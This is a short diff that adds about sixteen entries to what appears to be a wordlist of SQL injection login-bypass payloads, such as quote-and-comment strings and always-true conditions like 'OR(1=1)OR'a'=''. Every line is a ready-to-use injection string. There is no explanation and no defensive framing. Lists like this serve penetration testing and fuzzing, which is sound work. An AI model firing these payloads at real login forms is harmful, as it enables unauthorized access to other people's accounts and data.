@@ -4,6 +4,21 @@
 ' or true--
 admin' --
 admin' #
+' ''='
+['=']
+' or 'true'='true
+mod('=')
+point('=')
+eval('=')
+' or '%0a'='%0a 
+' or '%00'='%00 
+`or` '=' 
++'='+ 
+'=';
+' or ''-'
+" or ""-"
+" or true--
+' or true--
 admin'/*
 admin' or '1'='1
 admin' or '1'='1'--
@@ -13,6 +28,7 @@ admin' or 1=1
 admin' or 1=1--
 admin' or 1=1#
 admin' or 1=1/*
+'OR(1=1)OR'a'=''
 '-'
 ' '
 '&'
